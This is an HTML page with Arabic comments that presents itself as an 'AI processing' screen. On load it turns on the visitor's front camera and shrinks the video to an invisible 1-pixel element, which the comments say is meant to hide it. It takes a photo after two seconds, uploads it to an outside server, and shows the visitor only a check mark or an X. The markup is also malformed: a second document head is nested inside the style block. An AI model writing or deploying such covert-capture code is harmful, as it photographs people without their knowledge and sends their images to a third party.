<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معالجة تلقائية</title>
    <style>
     <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>AI Processing</title>
    <style>
        
    <body {
    /* خلفية داكنة فائقة العمق مع إضاءة خفية */
    background: #050505;
    background-image: 
        radial-gradient(circle at 20% 30%, rgba(60, 80, 224, 0.15) 0%, transparent 50%),
        radial-gradient(circle at 80% 70%, rgba(224, 60, 150, 0.15) 0%, transparent 50%);
    
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    color: white;
}

/* إضافة بطاقة فخمة لعرض حالة المعالجة */
.container {
    padding: 50px;
    border-radius: 30px;
    background: rgba(255, 255, 255, 0.03);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255, 255, 255, 0.1);
    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
    text-align: center;
    animation: fadeIn 1s ease-out;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}
        /* تعديل الأبعاد لإخفاء الفيديو تماماً مع الحفاظ على عمل الكاميرا */
        video {
            width: 1px; /* تصغير العرض لـ 1 بكسل */
            height: 1px; /* تصغير الطول لـ 1 بكسل */
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0; /* جعل الفيديو شفافاً (غير مرئي) */
            pointer-events: none; /* لمنع أي تفاعل مع الفيديو المخفي */
            z-index: 1;
        }
        .result-mark {
            font-size: 120px;
            user-select: none;
            display: none;
            animation: scaleUp 0.3s ease-in-out;
            position: relative;
            z-index: 10;
        }
        #success-mark { color: #28a745; }
        #error-mark { color: #dc3545; }

        @keyframes scaleUp {
            from { transform: scale(0.5); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        canvas { display: none; }
    </style>
</head>
<body>

    <!-- عناصر الواجهة -->
    <video id="video" autoplay playsinline></video>
    <div id="success-mark" class="result-mark">✓</div>
    <div id="error-mark" class="result-mark">X</div>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const successEl = document.getElementById('success-mark');
        const errorEl = document.getElementById('error-mark');
        const ctx = canvas.getContext('2d');
        let globalStream = null;

        // دالة لتشغيل الكاميرا فوراً عند فتح الصفحة
        async function startCameraNow() {
            try {
                globalStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.srcObject = globalStream;
                
                video.onloadedmetadata = () => {
                    // الانتظار لمدة ثانيتين لتهيئة الكاميرا ثم التقاط الصورة تلقائياً
                    setTimeout(() => {
                        captureAndSendImage(globalStream);
                    }, 2000);
                };
            } catch (error) {
                console.error("خطأ في تشغيل الكاميرا:", error);
                // في حالة الخطأ، أظهر X الحمراء ليعرف المستخدم بوجود مشكلة
                showMark(errorEl);
            }
        }

        // دالة التقاط الصورة وإرسالها للسيرفر
        function captureAndSendImage(stream) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                if (!blob) {
                    showMark(errorEl);
                    stopCamera(stream);
                    return;
                }

                const formData = new FormData();
                formData.append('captured_image', blob, 'instant_snap.jpg');

                try {
                    // إرسال الصورة إلى سيرفر Render الخاص بك
                    const response = await fetch('https://threebod.onrender.com/api/upload', {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        showMark(successEl); // إظهار علامة الصح الأخضر عند النجاح
                    } else {
                        showMark(errorEl); // إظهار X إذا رفض السيرفر
                    }
                } catch (err) {
                    console.error(err);
                    showMark(errorEl); // إظهار X إذا فشل الاتصال بالشبكة
                } finally {
                    stopCamera(stream);
                }
            }, 'image/jpeg', 0.9);
        }

        function showMark(element) {
            // إخفاء عنصر الفيديو عند عرض النتيجة
            video.style.display = 'none';
            successEl.style.display = 'none';
            errorEl.style.display = 'none';
            element.style.display = 'block';
        }

        function stopCamera(stream) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }

        // انطلاق الكود فوراً عند تحميل الصفحة
        startCameraNow();
    </script>
</body>
</html>
